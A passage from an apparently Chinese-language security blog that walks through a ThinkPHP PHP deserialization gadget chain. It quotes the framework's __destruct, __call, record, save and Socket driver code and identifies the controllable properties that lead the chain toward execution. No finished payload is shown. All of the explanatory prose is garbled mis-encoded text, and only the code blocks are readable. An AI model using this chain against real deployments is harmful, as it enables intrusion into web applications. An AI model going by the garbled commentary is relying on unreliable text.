</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;hello,&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="‰ª£Á†ÅÂÆ°ËÆ°ÂàÜÊûê">‰ª£Á†ÅÂÆ°ËÆ°ÂàÜÊûê
</h4><p>ÂèçÂ∫èÂàóÂåñÔºå‰∏ÄËà¨ÈÉΩÊòØ‰ªé<code>__destruct</code>ÊàñËÄÖ<code>__wakeup</code>ÂÖ•ÊâãÁöÑÔºåËøôÈáåËøòÊòØ‰ªé<code>__destruct</code>ÊñπÊ≥ïÂÖ•ÊâãÔºåÁõ¥Êé•ÂÖ®Â±ÄÊêúÁ¥¢Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•ÁúãÂà∞ÊúâÂ¶Ç‰∏ãÂá†‰∏™ÈÄªËæëÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051407735.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305140718668"
	
	
></p>
<p>ÊêúÂà∞‰∫ÜÂ¶Ç‰∏äÂá†‰∏™ÊñπÊ≥ïÔºåÁúã‰∫Ü‰∏Ä‰∏ãÔºåÊÑüËßâÂ¶Ç‰∏ãÁöÑ‰∏§‰∏™ÁÇπÂèØËÉΩÂ≠òÂú®Âà©Áî®Ôºö</p>
<p>League\Flysystem\Cached\Storage\AbstractCache  Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">autosave</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>think\Model Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãÂèÇËÄÉÊñáÁ´†ÁöÑÂÖ•ÊâãÁÇπÊòØAbstractCacheÊäΩË±°Á±ªÁöÑÊñπÊ≥ïÔºåÊâÄ‰ª•Â∞±ÊòØÁ¨¨‰∫å‰∏™destruct()ÊñπÊ≥ïÔºåÁÆÄÂçïË∑ü‰∏Ä‰∏ã„ÄÇ</p>
<p><code>lazySave</code>Â∞±ÊòØÁ±ªÁöÑ‰∏Ä‰∏™ÂèòÈáèÔºåÂú®ÂèçÂ∫èÂàóÂåñÊó∂ÂèØ‰ª•ËµãÂÄº‰∏∫‰ªªÊÑèÂÄºÔºåË∑üËøõË∞ÉÁî®ÁöÑsave()ÊñπÊ≥ïÔºåËøôÈáåÁöÑAbstractCacheÁ±ªÊòØÊäΩË±°Á±ªÔºåÊâÄ‰ª•ÊòØÂøÖÁÑ∂Êúâsave()ÊñπÊ≥ïÁöÑÂÆûÁé∞‰∫ÜÔºåAbstractCacheÁ±ªÁöÑÂÆûÁé∞Á±ªÊúâÂ¶Ç‰∏ãÂá†‰∏™Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051433021.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305143357955"
	
	
></p>
<p>ËøôÈáåÁöÑÈìæÂ≠êÊòØÈúÄË¶ÅË∞ÉÁî®Âà∞League\Flysystem\Cached\Storage\Psr6CacheÁöÑsave()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pool</span><span class="o">-&gt;</span><span class="na">getItem</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getForStorage</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">expiresAfter</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expire</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pool</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏çÊòØÂæàÊ∏ÖÊ•öËøôÈáåÔºåÁ°ÆÂÆû‰ºöÊâæÂ≠êÁ±ªÁöÑsave()ÊñπÊ≥ïÁöÑÂÆûÁé∞Ôºå‰ΩÜÊòØ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàËøôÈáåÂ∞±ÊòØË∞ÉÁî®ÁöÑËøô‰∏™Á±ªÁöÑsave()ÊñπÊ≥ïÔºåÂÖà‰∏çÁÆ°ÔºåË∑ü‰∏Ä‰∏ãÈìæÂ≠êÔºåÂêéÈù¢ÂàÜÊûê‰∏Ä‰∏ãÁîüÊàêÈÄªËæë„ÄÇ</p>
<p>ÈìæÂ≠êÂêéÈù¢‰ºöÂÜçÊ¨°Ë∞ÉÁî®Âà∞<code>__call()</code>ÊñπÊ≥ïÔºåÂè™Ë¶ÅÂ∞ÜËøô‰∏™ÁêÜÁöÑ<code>$this-&gt;pool</code>ËÆæÁΩÆ‰∏∫‰∏Ä‰∏™Á±ªÂç≥ÂèØÔºåËøôÈáåÈÄâÁî®ÁöÑÊòØthink\log\ChannelÁ±ªÁöÑ<code>__call()</code>ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="o">...</span><span class="nv">$parameters</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèÇÊï∞‰º†ÈÄíÁöÑËØùÔºåËøôÈáåÁöÑ<code>$method</code>ÊòØgetItem()ÊñπÊ≥ïÂêçÔºåËÄå$parametersÂ∞±ÊòØÂâçÈù¢‰º†ÁöÑ<code>$this-&gt;key</code>ÔºåÁúã‰∫Ü‰∏Ä‰∏ãÔºåËøô‰∏™poolÂíåkeyÈÉΩÊòØÁ±ªÂÆö‰πâÁöÑÂèòÈáèÔºåÊâÄ‰ª•ËøôÈáåÈÉΩÊòØÂèØÊéßÁöÑ„ÄÇÁÑ∂ÂêéË∑üËøõlog()ÊñπÊ≥ïÔºå‰ºöË∞ÉÁî®record()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$level</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$context</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">record</span><span class="p">(</span><span class="nv">$message</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$context</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂÜçË∑üËøõrecord()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">record</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$context</span> <span class="o">=</span> <span class="p">[],</span> <span class="nx">bool</span> <span class="nv">$lazy</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">close</span> <span class="o">||</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$context</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$replace</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$context</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$replace</span><span class="p">[</span><span class="s1">&#39;{&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;}&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">strtr</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span> <span class="o">===</span> <span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">[</span><span class="nv">$type</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">-&gt;</span><span class="na">trigger</span><span class="p">(</span><span class="k">new</span> <span class="nx">LogRecord</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazy</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$lazy</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁªßÁª≠ÁúãÈìæÂ≠êÔºåÂú®record()ÊñπÊ≥ï‰∏≠Ôºå‰∏ªË¶ÅËøòÊòØ‰∏∫‰∫ÜË∞ÉÁî®ÊúÄÂêéÁöÑsave()ÊñπÊ≥ïÔºåÁÆÄÂçïÁúã‰∏Ä‰∏ãÂâçÈù¢ÁöÑ‰ª£Á†ÅÔºåÁúãÊòØÂê¶ÂèØ‰ª•ÂÆûÁé∞Ë∞ÉÁî®save()ÊñπÊ≥ïÔºö</p>
<p>ÂâçÈù¢ÊÄªÁöÑÊù•ËØ¥ÊòØÈúÄË¶ÅÈÄöËøá‰∏â‰∏™ifÊù°‰ª∂Ôºå</p>
<ul>
<li>Á¨¨‰∏Ä‰∏™ifÊù°‰ª∂Ôºö</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">close</span> <span class="o">||</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞±ÊòØÈúÄË¶Å<code>$this-&gt;close</code>‰∏∫falseÔºåÁÑ∂ÂêéÂêéÈù¢ÁöÑallowÂÆö‰πâÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºå‰ªé‰ª£Á†ÅÈÄªËæëÊù•ÁúãÔºåË¶Å‰πàËøô‰∏™Êï∞ÁªÑ‰∏∫Á©∫ÔºåË¶Å‰πàËøô‰∏™Êï∞ÁªÑÈáåÈù¢Â≠òÂú®getItemËøô‰∏™ÂÄºÔºåÂ∞±‰∏ç‰ºöËøõÂÖ•Ëøô‰∏™ifËØ≠Âè•„ÄÇ</p>
<ul>
<li>Á¨¨‰∫å‰∏™ifÊù°‰ª∂Ôºö</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$context</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$replace</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$context</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$replace</span><span class="p">[</span><span class="s1">&#39;{&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;}&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">strtr</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âà§Êñ≠<code>$msg</code>ÊòØÂê¶‰∏∫Â≠óÁ¨¶‰∏≤Á±ªÂûãÔºåÁÑ∂ÂêéÂà§Êñ≠<code>$context</code>ÂèòÈáèÊòØÂê¶‰∏∫Á©∫ÔºåËøô‰∏™<code>$msg</code>ÁöÑÂÄºÊòØÂèØÊéßÁöÑÔºåËÄå‰∏î‰ªérecord()ÂáΩÊï∞ÁöÑÂΩ¢ÂèÇÊù•ÁúãÔºåËøôÈáåÁöÑ<code>$context</code>ÂèòÈáèÂ∞±ÊòØ‰∏Ä‰∏™Á©∫ÂÄºÔºåÊâÄ‰ª•Á¨¨‰∫å‰∏™ifÊù°‰ª∂Â∫îËØ•ÊòØ‰∏ç‰ºöËøõÂÖ•ÁöÑ„ÄÇ</p>
<ul>
<li>Á¨¨‰∏â‰∏™ifÊù°‰ª∂Ôºö</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span> <span class="o">===</span> <span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">[</span><span class="nv">$type</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">-&gt;</span><span class="na">trigger</span><span class="p">(</span><span class="k">new</span> <span class="nx">LogRecord</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáå<code>$msg</code>‰∏ç‰∏∫Á©∫ÔºåÂ∞±ÂèØ‰ª•ËøõÂÖ•Ëøô‰∏™ifÊù°‰ª∂ÔºåÂêåÊ†∑ÂèØ‰ª•ÊéßÂà∂Âà∞‰∏çËøõÂÖ•Ëøô‰∏™ifÊù°‰ª∂Ôºå‰ΩÜÊòØËøôÈáåËøò‰∏çÁü•ÈÅìÊúâ‰ªÄ‰πàÁî®ÔºåÂÖà‰∏çÁÆ°„ÄÇ</p>
<ul>
<li>ÊúÄÂêéÂà∞‰∫ÜË∞ÉÁî®save()ÊñπÊ≥ïÁöÑifËØ≠Âè•Ôºö</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazy</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$lazy</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑ<code>$this-&gt;lazy</code>ÂèòÈáèÊòØÁ±ªÂèòÈáèÔºåÂèØ‰ª•ÊéßÂà∂„ÄÇ</p>
<p>ÈÇ£‰πàÁé∞Âú®Êù•Áúãsave()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">()</span><span class="o">:</span> <span class="nx">bool</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$log</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$event</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">LogWrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">,</span> <span class="nv">$log</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">-&gt;</span><span class="na">trigger</span><span class="p">(</span><span class="nv">$event</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$log</span> <span class="o">=</span> <span class="nv">$event</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$log</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clear</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑ<code>$this-&gt;logger</code>ÂèØÊéßÔºåË∞ÉÁî®‰ªªÊÑèÁ±ªÁöÑsave()ÊñπÊ≥ïÔºåÊàñËÄÖ<code>__call()</code>ÊñπÊ≥ïÔºå‰ΩÜÊòØËøôÈáåÁöÑÈìæÂ≠êË∑üÁöÑÊòØthink\log\driver\SocketÁ±ªÁöÑsave()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051537458.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305153706377"
	
	
></p>
<p>ÈúÄË¶Åcheck()ÂáΩÊï∞ËøîÂõûtrueÔºåË∑üËøõcheck()ÂáΩÊï∞Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051541323.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154131258"
	
	
></p>
<p>ËøôÈáåÂè™ÈúÄË¶ÅÊéßÂà∂<code>$this-&gt;config['force_client_ids']</code>‰∏∫trueÔºå<code>$this-&gt;config['allow_client_ids']</code>‰∏∫Á©∫ÔºåÊúÄÂêéÂ∞±‰ºöËøîÂõûtrue„ÄÇÔºàps:ÂÖ≥ÈîÆ‰ª£Á†ÅÈÄªËæëÂ§ÑÁêÜÁúüÈáçË¶ÅÂëÄÔºåËá™Â∑±ÂÖàÁúã‰∫Ü‰∏Ä‰∏ãÔºå‰∏ÄÁõ¥Ê≤°ÊèêÂèñÂá∫Êù•ÈáçÁÇπÔºåÁúã‰∫Ü‰∏Ä‰∏ãÂèÇËÄÉÊñáÁ´†ÔºåËøôÈáçÁÇπÊäìÂæóÊòØÁúüÂáÜÂëÄÔºåÂè™ÈúÄË¶ÅÊéßÂà∂ËøôÂá†‰∏™ÂèÇÊï∞Â∞±ÂèØ‰ª•Áõ¥Êé•ËææÂà∞ÁõÆÁöÑÔºâ„ÄÇ</p>
<p>ËÄåÂØπ‰∫éËøôÈáåÂæóconfigÔºåÂÆö‰πâÂ∞±ÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºåÂ¶Ç‰∏ãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051544151.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154446091"
	
	
></p>
